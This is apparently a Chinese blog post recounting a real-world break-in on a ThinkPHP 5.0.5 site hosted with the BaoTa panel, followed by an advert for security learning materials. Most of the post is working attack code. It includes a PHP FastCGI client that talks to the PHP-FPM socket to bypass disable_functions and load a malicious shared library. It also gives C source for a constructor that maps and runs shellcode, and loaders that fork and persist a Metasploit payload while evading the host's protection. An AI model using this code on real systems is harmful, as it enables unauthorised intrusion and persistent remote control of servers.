# 原创
：  实战RCE绕过getshell曲折经历

# 实战RCE绕过getshell曲折经历

### tp rce漏洞

该网站debug显示该站点的tp版本为5.0.5，宝塔搭建

直接上rce payload

执行成功<br/> 问题点：<br/> 1.此站点disable_functions函数基本都禁用了，另外加载了禁用eval的扩展<br/> 2.web目录不允许出现.php后缀文件，写入后会立即删除

### 绕过限制getshell

由于站点禁用了eval，导致webshell管理工具不能使用，那就直接上线msf，但是disable_functions和eval禁用了命令执行和几个绕过disable_functions的函数，经过尝试，发现只有FastCGI-FPM的方式可以绕过限制，并且加载恶意so<br/> FastCGI-FPM绕过请参考：[从一道CTF学习Fastcgi绕过姿势-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/186186)<br/> 构造FastCGI-FPM php脚本：

```
&lt;?php
echo "&lt;br&gt;include success&lt;br/&gt;";
class TimedOutException extends \Exception
{
}
class ForbiddenException extends \Exception
{
}
class Client
{
const VERSION_1 = 1;
const BEGIN_REQUEST = 1;
const ABORT_REQUEST = 2;
const END_REQUEST = 3;
const PARAMS = 4;
const STDIN = 5;
const STDOUT = 6;
const STDERR = 7;
const DATA = 8;
const GET_VALUES = 9;
const GET_VALUES_RESULT = 10;
const UNKNOWN_TYPE = 11;
const MAXTYPE = self::UNKNOWN_TYPE;
const RESPONDER = 1;
const AUTHORIZER = 2;
const FILTER = 3;
const REQUEST_COMPLETE = 0;
const CANT_MPX_CONN = 1;
const OVERLOADED = 2;
const UNKNOWN_ROLE = 3;
const MAX_CONNS = 'MAX_CONNS';
const MAX_REQS = 'MAX_REQS';
const MPXS_CONNS = 'MPXS_CONNS';
const HEADER_LEN = 8;
const REQ_STATE_WRITTEN = 1;
const REQ_STATE_OK = 2;
const REQ_STATE_ERR = 3;
const REQ_STATE_TIMED_OUT = 4;
private $_sock = null;
private $_host = null;
private $_port = null;
private $_keepAlive = false;
private $_requests = array();
private $_persistentSocket = false;
private $_connectTimeout = 5000;
private $_readWriteTimeout = 5000;
public function __construct($host, $port)
{
$this-&gt;_host = $host;
$this-&gt;_port = $port;
}
public function setKeepAlive($b)
{
$this-&gt;_keepAlive = (boolean) $b;
if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) {
fclose($this-&gt;_sock);
}
}
public function getKeepAlive()
{
return $this-&gt;_keepAlive;
}
public function setPersistentSocket($b)
{
$was_persistent = ($this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket);
$this-&gt;_persistentSocket = (boolean) $b;
if (!$this-&gt;_persistentSocket &amp;&amp; $was_persistent) {
fclose($this-&gt;_sock);
}
}
public function getPersistentSocket()
{
return $this-&gt;_persistentSocket;
}
public function setConnectTimeout($timeoutMs)
{
$this-&gt;_connectTimeout = $timeoutMs;
}
public function getConnectTimeout()
{
return $this-&gt;_connectTimeout;
}
public function setReadWriteTimeout($timeoutMs)
{
$this-&gt;_readWriteTimeout = $timeoutMs;
$this-&gt;set_ms_timeout($this-&gt;_readWriteTimeout);
}
public function getReadWriteTimeout()
{
return $this-&gt;_readWriteTimeout;
}
private function set_ms_timeout($timeoutMs)
{
if (!$this-&gt;_sock) {
return false;
}
return stream_set_timeout($this-&gt;_sock, floor($timeoutMs / 1000), ($timeoutMs % 1000) * 1000);
}
private function connect()
{
if (!$this-&gt;_sock) {
if ($this-&gt;_persistentSocket) {
$this-&gt;_sock = pfsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000);
} else {
$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000);
}
if (!$this-&gt;_sock) {
throw new \Exception('Unable to connect to FastCGI application: ' . $errstr);
}
if (!$this-&gt;set_ms_timeout($this-&gt;_readWriteTimeout)) {
throw new \Exception('Unable to set timeout on socket');
}
}
}
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1) /* version */
. chr($type) /* type */
. chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
. chr($requestId &amp; 0xFF) /* requestIdB0 */
. chr(($clen &gt;&gt; 8) &amp; 0xFF) /* contentLengthB1 */
. chr($clen &amp; 0xFF) /* contentLengthB0 */
. chr(0) /* paddingLength */
. chr(0) /* reserved */
. $content; /* content */
}
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen &lt; 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
$nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
}
if ($vlen &lt; 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
$nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
}
/* nameData &amp; valueData */
return $nvpair . $name . $value;
}
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data { $p++});
if ($nlen &gt;= 128) {
$nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
$nlen |= (ord($data{ $p++}) &lt;&lt; 16);
$nlen |= (ord($data{ $p++}) &lt;&lt; 8);
$nlen |= (ord($data{ $p++}));
}
$vlen = ord($data { $p++});
if ($vlen &gt;= 128) {
$vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
$vlen |= (ord($data{ $p++}) &lt;&lt; 16);
$vlen |= (ord($data{ $p++}) &lt;&lt; 8);
$vlen |= (ord($data{ $p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p + $nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
private function decodePacketHeader($data)
{
$ret = array();
$ret['version'] = ord($data { 0});
$ret['type'] = ord($data { 1});
$ret['requestId'] = (ord($data{ 2}) &lt;&lt; 8) + ord($data { 3});
$ret['contentLength'] = (ord($data{ 4}) &lt;&lt; 8) + ord($data { 5});
$ret['paddingLength'] = ord($data { 6});
$ret['reserved'] = ord($data { 7});
return $ret;
}
private function readPacket()
{
if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) {
$resp = $this-&gt;decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len = $resp['contentLength'];
while ($len &amp;&amp; ($buf = fread($this-&gt;_sock, $len)) !== false) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf = fread($this-&gt;_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
public function getValues(array $requestedInfo)
{
$this-&gt;connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this-&gt;buildNvpair($info, '');
}
fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
$resp = $this-&gt;readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this-&gt;readNvpair($resp['content'], $resp['length']);
} else {
throw new \Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
public function request(array $params, $stdin)
{
$id = $this-&gt;async_request($params, $stdin);
return $this-&gt;wait_for_response($id);
}
public function async_request(array $params, $stdin)
{
$this-&gt;connect();
// Pick random number between 1 and max 16 bit unsigned int 65535
$id = mt_rand(1, (1 &lt;&lt; 16) - 1);
// Using persistent sockets implies you want them keept alive by server!
$keepAlive = intval($this-&gt;_keepAlive || $this-&gt;_persistentSocket);
$request = $this-&gt;buildPacket(
self::BEGIN_REQUEST
, chr(0) . chr(self::RESPONDER) . chr($keepAlive) . str_repeat(chr(0), 5)
,
$id
);
$paramsRequest = '';
foreach ($params as $key =&gt; $value) {
$paramsRequest .= $this-&gt;buildNvpair($key, $value, $id);
}
if ($paramsRequest) {
$request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest, $id);
}
$request .= $this-&gt;buildPacket(self::PARAMS, '', $id);
if ($stdin) {
$request .= $this-&gt;buildPacket(self::STDIN, $stdin, $id);
}
$request .= $this-&gt;buildPacket(self::STDIN, '', $id);
if (fwrite($this-&gt;_sock, $request) === false || fflush($this-&gt;_sock) === false) {
$info = stream_get_meta_data($this-&gt;_sock);
if ($info['timed_out']) {
throw new TimedOutException('Write timed out');
}
// Broken pipe, tear down so future requests might succeed
fclose($this-&gt;_sock);
throw new \Exception('Failed to write request to socket');
}
$this-&gt;_requests[$id] = array(
'state' =&gt; self::REQ_STATE_WRITTEN,
'response' =&gt; null
);
return $id;
}
public function wait_for_response($requestId, $timeoutMs = 0)
{
if (!isset($this-&gt;_requests[$requestId])) {
throw new \Exception('Invalid request id given');
}
if (
$this-&gt;_requests[$requestId]['state'] == self::REQ_STATE_OK
|| $this-&gt;_requests[$requestId]['state'] == self::REQ_STATE_ERR
) {
return $this-&gt;_requests[$requestId]['response'];
}
if ($timeoutMs &gt; 0) {
// Reset timeout on socket for now
$this-&gt;set_ms_timeout($timeoutMs);
} else {
$timeoutMs = $this-&gt;_readWriteTimeout;
}
$startTime = microtime(true);
do {
$resp = $this-&gt;readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
if ($resp['type'] == self::STDERR) {
$this-&gt;_requests[$resp['requestId']]['state'] = self::REQ_STATE_ERR;
}
$this-&gt;_requests[$resp['requestId']]['response'] .= $resp['content'];
}
if ($resp['type'] == self::END_REQUEST) {
$this-&gt;_requests[$resp['requestId']]['state'] = self::REQ_STATE_OK;
if ($resp['requestId'] == $requestId) {
break;
}
}
if (microtime(true) - $startTime &gt;= ($timeoutMs * 1000)) {
// Reset
$this-&gt;set_ms_timeout($this-&gt;_readWriteTimeout);
throw new \Exception('Timed out');
}
} while ($resp);
if (!is_array($resp)) {
$info = stream_get_meta_data($this-&gt;_sock);
// We must reset timeout but it must be AFTER we get info
$this-&gt;set_ms_timeout($this-&gt;_readWriteTimeout);
if ($info['timed_out']) {
throw new TimedOutException('Read timed out');
}
if (
$info['unread_bytes'] == 0
&amp;&amp; $info['blocked']
&amp;&amp; $info['eof']
) {
throw new ForbiddenException('Not in white list. Check listen.allowed_clients.');
}
throw new \Exception('Read failed');
}
// Reset timeout
$this-&gt;set_ms_timeout($this-&gt;_readWriteTimeout);
switch (ord($resp['content'] { 4})) {
case self::CANT_MPX_CONN:
throw new \Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new \Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new \Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $this-&gt;_requests[$requestId]['response'];
}
}
}
//php-cgi.sock路径
$sock = "/tmp/php-cgi-56.sock";
//待加载的so文件
$so_name = "ffflg.so";
//web php路径
$filepath0 = "/www/wwwroot/xxx.com/index.php";

$client = new Client("unix://$sock", -1);
// $client = new Client('127.0.0.1', '9000');
//扩展so设置
$php_value = "extension = /tmp/$so_name\n";
$filepath = $filepath0;
$code = "test";
echo $client-&gt;request(
array(
'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
'REQUEST_METHOD' =&gt; 'POST',
'SCRIPT_FILENAME' =&gt; $filepath,
'SCRIPT_NAME' =&gt; $filepath,
'SERVER_SOFTWARE' =&gt; 'php/fcgiclient',
'REMOTE_ADDR' =&gt; '127.0.0.1',
'REMOTE_PORT' =&gt; '9985',
'SERVER_ADDR' =&gt; '127.0.0.1',
'SERVER_PORT' =&gt; '80',
'SERVER_NAME' =&gt; 'mag-tured',
'SERVER_PROTOCOL' =&gt; 'HTTP/1.1',
'CONTENT_TYPE' =&gt; 'application/x-www-form-urlencoded',
'CONTENT_LENGTH' =&gt; strlen($code),
'PHP_VALUE' =&gt; $php_value,
),
$code
);

echo "&lt;br&gt;success&lt;br&gt;";
?&gt;
```

加载shellcode的so源码：

```
//加载shellcode
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;string.h&gt;


//__attribute__ ((__constructor__))约定符会将函数标记为构造函数，加载时自动执行
__attribute__ ((__constructor__)) void preload (void){
unsigned char code[] = [shellcode]; //shellcode自己写，别懒

void *mem = mmap(NULL, sizeof(code), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
memcpy(mem, code, sizeof(code));
((void(*)())mem)();
}
```

编译为so文件<br/>`&gt; gcc loader.c -fPIC -shared -o ffflg.so`<br/> 将php脚本及编译好的so文件传到服务器上，包含php脚本加载so

<br/> 虽然成功上线，但是过一会就自己会掉线，经过测试发现这是php-fpm进程的问题，由于php-fpm进程加载的so文件，所以php-fpm进程结束时，会话自动掉线，php-fpm受到php脚本执行超时时间影响，导致时间一到就会退出php-fpm进程。<br/> 不过既然能上线，那么不就可以执行命令吗，可以执行命令不就能再弹一个shell嘛，嘿嘿<br/>  

<br/> 突遭雷击，执行命令居然有宝塔的防护，这下好像彻底没戏了，不过经过后面思考测试，发现宝塔应该是防御的用户态(壳，类似于hook bash程序)，既然这样的话，那么通过C调用底层的系统调用函数(简单来说是通过软中断由用户态切换到内核态)，不就可以绕过限制了吗？

## 绕过限制获取持久shell

生成msf的马，并上传至服务器，发现没有执行权限<br/>  

<br/> 那就尝试用exec函数族调用chmod程序给木马加个执行权限

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

__attribute__ ((__constructor__)) void preload (void){
char *programPath = "/bin/chmod";
char *arguments[] = {programPath, "755", "/tmp/debug1", NULL};

if (execvp(programPath, arguments) == -1) {
perror("execvp");
exit(EXIT_FAILURE);
}

// 这里的代码不会执行，除非 execvp 失败
printf("This line won't be reached.\n");
}
```

<br/> 成功了，nice，接下来执行上线

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;

__attribute__ ((__constructor__)) void preload (void){
pid_t pid = fork();

if (pid == -1) {
perror("fork");
exit(EXIT_FAILURE);
}

if (pid == 0) {
// 子进程

char *programPath = "/tmp/debug1";
char *arguments[] = {programPath, NULL};

if (execvp(programPath, arguments) == -1) {
perror("execvp");
exit(EXIT_FAILURE);
}

// 这里的代码不会执行，因为 execvp 成功后子进程已经被替代
printf("This line won't be reached in the child process.\n");
} else {

// 父进程等待子进程结束
wait(NULL);

printf("Parent process is done.\n");
}
}
```

需要注意的是，如果直接使用exec函数族调用该木马，依旧会在时间超时后掉线，因为其依赖于创建它的php-fpm进程，php-fpm进程退出，该木马进程也会退出，所以以上代码使用了开启子进程的方式加载木马，这样可以脱离php-fpm进程，达到持续运行的效果<br/>  

<br/> 成功上线，会话不会再出现超时断开的问题。

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/578fb75dd3df431cb0d2a837161efabc.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/ab38e350c4624bc4aea055c895544a73.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/53eb30e473574d98aefb81b70215b4b1.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/16750748d8934f7da658c7a373ffd6d6.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/2512ada3bb79417a940e643b220bb19f.png" width="665"/>

应急响应笔记

学习路线
